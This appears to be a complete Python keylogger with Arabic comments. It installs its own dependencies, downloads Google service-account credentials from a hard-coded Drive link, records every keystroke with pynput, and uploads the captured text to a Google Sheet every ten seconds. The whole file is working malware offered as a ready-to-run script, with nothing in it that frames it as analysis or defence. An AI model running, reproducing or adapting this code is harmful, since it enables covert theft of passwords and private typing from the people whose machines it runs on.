import os
import subprocess
import sys
import gspread
from oauth2client.service_account import ServiceAccountCredentials
import pynput.keyboard
import threading
import requests

# التأكد من تثبيت المكتبات الضرورية
def install_libraries():
    try:
        import gspread
        import oauth2client
        import pynput
    except ImportError:
        print("بعض المكتبات مفقودة، يتم تثبيتها الآن...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "gspread", "oauth2client", "pynput"])

# التحقق من وجود بايثون
def check_python():
    if not sys.executable:
        print("Python غير مثبت. الرجاء تثبيت Python يدويًا.")
        return False
    return True

# استدعاء دالة تثبيت المكتبات
install_libraries()

# رابط Google Drive لتنزيل credentials.json
url = "https://drive.google.com/uc?export=download&id=1ewzx0przRvr1VuEh6wlgwUZYE-bj8hvJ"

# تنزيل ملف credentials.json من Google Drive
try:
    response = requests.get(url)
    with open('credentials.json', 'wb') as file:
        file.write(response.content)
    print("تم تنزيل ملف credentials.json بنجاح.")
except Exception as e:
    print(f"حدث خطأ أثناء تنزيل ملف credentials.json: {e}")

# إعداد Google Sheets API
scope = ["https://spreadsheets.google.com/feeds", 'https://www.googleapis.com/auth/drive']
try:
    creds = ServiceAccountCredentials.from_json_keyfile_name('credentials.json', scope)
    client = gspread.authorize(creds)
    print("تم الاتصال بـ Google Sheets API بنجاح.")
except Exception as e:
    print(f"حدث خطأ أثناء الاتصال بـ Google Sheets API: {e}")

# فتح ملف Google Sheets
try:
    sheet = client.open("report").sheet1  # تأكد من أن اسم الورقة صحيح
    print("تم فتح ملف Google Sheets بنجاح.")
except Exception as e:
    print(f"حدث خطأ أثناء فتح ملف Google Sheets: {e}")

log = ""  # تخزين ضغطات المفاتيح

def process_key_press(key):
    global log
    try:
        log += str(key.char)
        print(f"تم تسجيل ضغطة مفتاح: {log}")  # طباعة لضمان تسجيل ضغطات المفاتيح
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += " " + str(key) + " "
    except Exception as e:
        print(f"حدث خطأ أثناء تسجيل ضغطات المفاتيح: {e}")

def report():
    global log
    if log:
        try:
            # إرسال البيانات إلى Google Sheets
            sheet.append_row([log])
            print("تم إرسال البيانات إلى Google Sheets: ", log)
        except Exception as e:
            print(f"حدث خطأ أثناء إرسال البيانات إلى Google Sheets: {e}")
    log = ""  # إعادة تعيين سجل ضغطات المفاتيح
    timer = threading.Timer(10, report)  # الإرسال كل 10 ثوانٍ بدلاً من 60 لتسريع العملية
    timer.start()

from pynput import keyboard

# بدء الاستماع لضغطات المفاتيح
try:
    with keyboard.Listener(on_press=process_key_press) as listener:
        report()
        listener.join()
except Exception as e:
    print(f"حدث خطأ أثناء الاستماع لضغطات المفاتيح: {e}")
